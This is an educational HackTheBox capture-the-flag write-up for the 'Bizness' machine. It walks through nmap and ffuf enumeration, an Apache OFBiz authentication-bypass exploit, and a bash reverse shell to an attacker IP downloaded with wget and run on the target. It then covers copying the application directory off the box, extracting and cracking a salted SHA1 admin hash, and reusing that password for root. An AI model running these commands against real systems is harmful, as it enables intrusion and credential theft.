Bizness is an easy rated machine on HackTheBox although many players/hackers disagree leading to a current review of 2.8 stars only. I enjoyed the first half of the box because i was able to get user on my own. The privilege escalation led me into rabbit holes and i had to read multiple writeups to understand whats really going on. 

```
# Nmap 7.94SVN scan initiated Sat Jun 15 12:48:58 2024 as: nmap -sVC -p- -A -vv -oN nmap 10.10.11.252
Nmap scan report for 10.10.11.252
Host is up, received echo-reply ttl 63 (0.025s latency).
Scanned at 2024-06-15 12:48:58 CEST for 41s
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf+Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N/17+rIZkSmdZPQi8chG/PyZ+H1FqcFB2LyxrynHCBLPTWyuN/tXkaVoDH/aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR+t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk/K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq+rYtd+DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ/IF1cIyfzo1gicwVcLm4iRD9umBFaM2E=
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB/Pupk38CIbFpK4/RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw=
|   256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/3
80/tcp    open  http       syn-ack ttl 63 nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://bizness.htb/
|_http-server-header: nginx/1.18.0
443/tcp   open  ssl/http   syn-ack ttl 63 nginx 1.18.0
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-12-14T20:03:40
| Not valid after:  2328-11-10T20:03:40
| MD5:   b182:2fdb:92b0:2036:6b98:8850:b66e:da27
| SHA-1: 8138:8595:4343:f40f:937b:cc82:23af:9052:3f5d:eb50
| -----BEGIN CERTIFICATE-----
| MIIDbTCCAlWgAwIBAgIUcNuUwJFmLYEqrKfOdzHtcHum2IwwDQYJKoZIhvcNAQEL
| BQAwRTELMAkGA1UEBhMCVUsxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
| GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAgFw0yMzEyMTQyMDAzNDBaGA8yMzI4
| MTExMDIwMDM0MFowRTELMAkGA1UEBhMCVUsxEzARBgNVBAgMClNvbWUtU3RhdGUx
| ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAK4O2guKkSjwv8sruMD3DiDi1FoappVwDJ86afPZ
| XUCwlhtZD/9gPeXuRIy66QKNSzv8H7cGfzEL8peDF9YhmwvYc+IESuemPscZSlbr
| tSdWXVjn4kMRlah/2PnnWZ/Rc7I237V36lbsavjkY6SgBK8EPU3mAdHNdIBqB+XH
| ME/G3uP/Ut0tuhU1AAd7jiDktv8+c82EQx21/RPhuuZv7HA3pYdtkUja64bSu/kG
| 7FOWPxKTvYxxcWdO02GRXs+VLce+q8tQ7hRqAQI5vwWU6Ht3K82oftVPMZfT4BAp
| 4P4vhXvvcyhrjgjzGPH4QdDmyFkL3B4ljJfZrbXo4jXqp4kCAwEAAaNTMFEwHQYD
| VR0OBBYEFKXr9HwWqLMEFnr6keuCa8Fm7JOpMB8GA1UdIwQYMBaAFKXr9HwWqLME
| Fnr6keuCa8Fm7JOpMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AFruPmKZwggy7XRwDF6EJTnNe9wAC7SZrTPC1gAaNZ+3BI5RzUaOkElU0f+YBIci
| lSvcZde+dw+5aidyo5L9j3d8HAFqa/DP+xAF8Jya0LB2rIg/dSoFt0szla1jQ+Ff
| 6zMNMNseYhCFjHdxfroGhUwYWXEpc7kT7hL9zYy5Gbmd37oLYZAFQv+HNfjHnE+2
| /gTR+RwkAf81U3b7Czl39VJhMu3eRkI3Kq8LiZYoFXr99A4oefKg1xiN3vKEtou/
| c1zAVUdnau5FQSAbwjDg0XqRrs1otS0YQhyMw/3D8X+f/vPDN9rFG8l9Q5wZLmCa
| zj1Tly1wsPCYAq9u570e22U=
|_-----END CERTIFICATE-----
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://bizness.htb/
40875/tcp open  tcpwrapped syn-ack ttl 63
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=6/15%OT=22%CT=1%CU=35495%PV=Y%DS=2%DC=T%G=Y%TM=666D
OS:71C3%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
OS:OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53C
OS:ST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Uptime guess: 17.726 days (since Tue May 28 19:24:29 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   25.68 ms 10.10.14.1
2   25.77 ms 10.10.11.252

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 15 12:49:39 2024 -- 1 IP address (1 host up) scanned in 41.34 seconds

```

Starting with the nmap scan there is only three open ports.
The openSSH version doesnt seem much interesting, thats why i move on to the webpage running on port 80

![[Pasted image 20240615125252.png]]
It resolves to https://bizness.htb

```
sudo nano /etc/hosts
```

![[Pasted image 20240615125456.png]]

after adding this to our hosts file we can see the webpage its serving:
![[Pasted image 20240615125639.png]]

click on advanced and proceed

![[Pasted image 20240615125715.png]]

I am going to use ffuf to scan for directories and subdomains. If you do not know how to use ffuf you can read about it on http://ffuf.me


```
┌──(kali㉿kali)-[~/Bizness]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://bizness.htb/ -H "Host:FUZZ.bizness.htb" -fw 5 -o ffuf_sub          

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://bizness.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.bizness.htb
 :: Output file      : ffuf_sub
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 5
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 1438 req/sec :: Duration: [0:01:47] :: Errors: 0 ::

```
i wasnt able to find any subdomains

```
┌──(kali㉿kali)-[~/Bizness]                                                                                                                                                                                                             
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u https://bizness.htb/FUZZ -e .txt,.html -fw 1 -o ffuf_dir                                                                                               

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET                                               
 :: URL              : https://bizness.htb/FUZZ          
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                         
 :: Extensions       : .txt .html                                             
 :: Output file      : ffuf_dir                      
 :: File format      : json                                                    
 :: Follow redirects : false                                                
 :: Calibration      : false                                                 
 :: Timeout          : 10                                                   
 :: Threads          : 40                                                     
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500         :: Filter           : Response words: 1           
________________________________________________                                   
control                 [Status: 200, Size: 34633, Words: 10468, Lines: 492, Duration: 334ms]                
:: Progress: [661680/661680] :: Job [1/1] :: 763 req/sec :: Duration: [0:16:58] :: Errors: 0 :: 
```
But my ffuf dirsearch found the endpoint /control

![[Pasted image 20240615135420.png]]

The error message shows us that some service called Apache OFBiz is used. 

After googling "Apache OFBiz cve"  stumbled upon this github repo: 
https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass

Then I cloned the repo to my kali machine:
```
┌──(kali㉿kali)-[~/Bizness]                        
└─$ git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git  
Cloning into 'Apache-OFBiz-Authentication-Bypass'...                       
remote: Enumerating objects: 19, done.                       
remote: Counting objects: 100% (14/14), done.          
remote: Compressing objects: 100% (12/12), done.      
remote: Total 19 (delta 3), reused 7 (delta 1), pack-reused 5    
Receiving objects: 100% (19/19), 51.44 MiB | 5.84 MiB/s, done. 
Resolving deltas: 100% (3/3), done.  
```

And created a file called shell.sh
```
nano shell.sh 
```

This is the contents of shell.sh:
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.10/9001 0>&1
```

Finally i set up a python http server on the same directory where the shell.sh file is located:

```
┌──(kali㉿kali)-[~/Bizness]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

I also opened a netcat listener on port 9001:
```
┌──(kali㉿kali)-[~/Bizness]
└─$ nc -nlvp 9001       
listening on [any] 9001 ...
```

and ran the script as shown:
```
┌──(kali㉿kali)-[~/Bizness/Apache-OFBiz-Authentication-Bypass]            
└─$ python3 exploit.py --url https://bizness.htb  --cmd  'wget 10.10.14.10/shell.sh'                                                 
[+] Generating payload...        
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true     
[+] Payload generated successfully.                               
[+] Sending malicious serialized payload...                       
[+] The request has been successfully sent. Check the result of the command.

┌──(kali㉿kali)-[~/Bizness/Apache-OFBiz-Authentication-Bypass]              
└─$ python3 exploit.py --url https://bizness.htb  --cmd  'chmod +x shell.sh'      
[+] Generating payload...        
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true      
[+] Payload generated successfully.                               
[+] Sending malicious serialized payload...                       
[+] The request has been successfully sent. Check the result of the command.

┌──(kali㉿kali)-[~/Bizness/Apache-OFBiz-Authentication-Bypass]       
└─$ python3 exploit.py --url https://bizness.htb  --cmd  './shell.sh'        
[+] Generating payload...        
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true   
[+] Payload generated successfully. 
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.
```

```
┌──(kali㉿kali)-[~/Bizness]
└─$ nc -nlvp 9001       
listening on [any] 9001 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.252] 56596
bash: cannot set terminal process group (553): Inappropriate ioctl for device
bash: no job control in this shell
ofbiz@bizness:/opt/ofbiz$ 
```

and we got a connection as user "ofbiz"

I upgraded my shell:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
[CTRL + Z]
stty raw -echo; fg
[enter]
export TERM=xterm-256color
```

This could not work for you if you are not using zsh on your attacker machine

also I ran stty -a (you can do that after the [CTRL+Z] part) and put the rows number and columns number in the revshell session in my case it is 50 for rows and 113 for cols :
```
stty rows 50 cols 113
```

Now we are able to retrieve the user flag in the /home/ofbiz directory:
```
ofbiz@bizness:/opt/ofbiz$ cd /home/ofbiz
ofbiz@bizness:~$ cat user.txt 
c90a2[REDACTED]9c55d
```


At this point i dont know what to do because the disk of the machine is full, thus i cannot downlaod linpeas with python http.server...

then i figured i can do it  in the /dev/shm directory and i used netcat this time:
```
on bizznet.htb machine: 
nc -nlvp 4000 > linpeas.sh

on attacker machine:
nc 10.10.11.252 4000 < linpeas.sh
```


```
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
/etc/systemd/system/multi-user.target.wants/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
/etc/systemd/system/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
/etc/systemd/system/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
You can't write on systemd PATH

```
Linpeas has a 95% PE output which isnt much interesting to us because the service is run as ofbiz


In this part i ran into rabbitholes and did not know what to do... After reading multiple solutions this is what i missed:

Because there is a webserver running we should have searched for credentials in the filesystem of Apache ofbiz. This is something I should note. Hopefully it pays off. 

By default Apache Ofbiz uses a database management system called "Apache Derby". To connect to the database we need to use some commandline utility called "ij". Because we can not download anything from apt into the machine we need to use it locally on out attacker machine. So download it and also compress the "/opt/ofbiz" directory into a file. 

and move it to your machine:
```
tar -zcvf file.tar.gz /opt/ofbiz/
```

This time i used http.server 
```
on remote machine:
python3 -m http.server 4444
```

```
on attacker machine:
wget 10.10.11.252:4444/file.tar.gz
tar -xf file.tar.gz
```

Although i think this method of moving files is not good because anyone has access to the files where the python server is running. Better to do it with netcat. But im too lazy for that now.


```
┌──(kali㉿kali)-[~/Bizness/ofbiz]
└─$ find . -name derby
./opt/ofbiz/runtime/data/derby
```
We can see that derby is located in '/opt/ofbiz/runtime/data/derby'

```
┌──(kali㉿kali)-[~/…/ofbiz/runtime/data/derby]
└─$ ls
derby.log  ofbiz  ofbizolap  ofbiztenant
```
And i guess these are the three databases, correct me if i am wrong.

now connect to the database locally with ij
[https://db.apache.org/derby/papers/DerbyTut/ij_intro.html] :
```
┌──(kali㉿kali)-[~/…/ofbiz/runtime/data/derby]
└─$ ij
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
ij version 10.14
ij> connect 'jdbc:derby:ofbiz';
```

Now we can type this to see all available tables in the database 'ofbiz':
```
ij> SHOW TABLES;
             
[...]                           
OFBIZ               |USER_LOGIN                    |            
[...]                            
```



We found a USER_LOGIN which seems interesting. 
```
ij> SELECT * FROM OFBIZ.USER_LOGIN;
[...]
admin                                         |$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
[...]
```
We found a hash... did we?
The string we retrieved from the ofbiz.USER_LOGIN table is "\$SHA\$d\$uP0_QaVBpDWFeo8-dRzDqRwXQ2I"

well lets look into the source code ofbiz 
```
    public static String cryptBytes(String hashType, String salt, byte[] bytes) {
        if (hashType == null) {
            hashType = "SHA";
        }
        if (salt == null) {
            salt = RandomStringUtils.random(new SecureRandom().nextInt(15) + 1, CRYPT_CHAR_SET);
        }
        StringBuilder sb = new StringBuilder();
        sb.append("$").append(hashType).append("$").append(salt).append("$");
        sb.append(getCryptedBytes(hashType, salt, bytes));
        return sb.toString();
    }
```
The Above code snippet shows how the hash is created. First it checks whether or not a hashType has been specified. If not it assigns "SHA" to "hashType". Then it checks whether a salt has been specified, if not it creates a random salt. Then it makes a string in the format \$hashtype\$salt\$anotherstring

the "anotherstring" part it gets from the following function:
```
private static String getCryptedBytes(String hashType, String salt, byte[] bytes) {
        try {
            MessageDigest messagedigest = MessageDigest.getInstance(hashType);
            messagedigest.update(salt.getBytes(UtilIO.getUtf8()));
            messagedigest.update(bytes);
            return Base64.encodeBase64URLSafeString(messagedigest.digest()).replace('+', '.');
        } catch (NoSuchAlgorithmException e) {
            throw new GeneralRuntimeException("Error while comparing password", e);
        }
    }
```
https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java
We can see that the plaintext password is hashed with a salt appended. Furthermore it gets Base64URL encoded. 

so the resulting string we found in the database is build like this:
 \$hashtype\$salt\$base64urlencodedstring

to reverse this and possibly view the plaintext password we need to first base64url**decode** it  
then get the bytes due to the function above using bytes as input.

```
┌──(kali㉿kali)-[~/Bizness]
└─$ echo 'uP0_QaVBpDWFeo8-dRzDqRwXQ2I' | basenc -d --base64url | xxd -p
basenc: invalid input
b8fd3f41a541a435857a8f3e751cc3a91c174362
```
this is the final salted hash

now we have to crack it
```
┌──(kali㉿kali)-[~/Bizness]     
└─$ hashcat -h | grep "salt"
[...]
    110 | sha1($pass.$salt)                                          | Raw Hash salted and/or iterated
    120 | sha1($salt.$pass)                                          | Raw Hash salted and/or iterated 
[...]
```

both work but we have to input it as \<hash\>:\<salt\> 

and then crack it:
```
hashcat -m 110 "b8fd3f41a541a435857a8f3e751cc3a91c174362:b" <PATH_TO_ROCKYOU.TXT>
```

```
[...]
b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness
[...]
```

This password is also reused as root on the remore machine 
```
ofbiz@bizness:/opt/ofbiz$ su -
Password: 
root@bizness:~# cat /root/root.txt 
14ebd[REDACTED]0da0d
```